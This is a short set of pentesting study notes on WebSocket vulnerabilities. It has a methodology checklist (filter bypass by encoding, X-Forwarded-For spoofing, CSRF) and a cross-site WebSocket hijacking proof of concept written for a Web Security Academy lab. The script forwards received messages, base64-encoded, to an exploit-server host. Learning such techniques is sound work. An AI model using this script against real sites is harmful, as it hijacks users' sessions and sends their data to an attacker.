---
title: "WebSockets"
layout: notes
tags:
  - webapp
  - methodology
  - websockets
---
## Summary

WebSockets are a technology best used for quick streams of data with no care for verifying the contents or double checking the client received it. They are full duplex over HTTP, used in modern webapps. Useful in low latency situations as a WebSocket once opened will sit quietly until it received a message from the other end. Exploiting a WebSocket has more to do with the technology it interacts with than the specific WebSocket technology itself. As with any web request the messages and handshake can be manipulated, and at worst a session can be hijacked from another user. 

## Methodology

When looking for WebSocket vulnerabilities ask/try the following:
- [ ] **What technologies does the WebSocket interact with?**
- [ ] **Is the data being encoded or encrypted locally before sending the message?**
- [ ] **Are there any filters or protections in place?**
	- [ ] try different encodings or obfuscation to bypass filters
	- [ ] try `X-Forwarded-For` or other headers to bypass IP blocking restrictions
- [ ] **Is this functionality vulnerable to CSRF?**
	- [ ] try to create a CSRF poc to hijack a session

## Tools/Examples

```
<script> 
    // Creating a new WebSocket instance and connecting to the specified URL 
    var ws = new WebSocket('wss://0a62001b032b8245813a992b003a00be.web-security-academy.net/chat'); 

    // Event handler for when the WebSocket connection is successfully opened 
    ws.onopen = function() { 
        // Sending the "READY" message to the server upon successful connection 
        ws.send("READY"); 
    }; 

    // Event handler for when a message is received from the WebSocket 
    ws.onmessage = function(event) { 
        // Sending a fetch request to an exploit server with the received message encoded in base64 
        fetch('https://exploit-0a9c00ef034282b3815a98f201d600bb.exploit-server.net/exploit?msg=' + btoa(event.data)); 
    }; 
</script> 
```





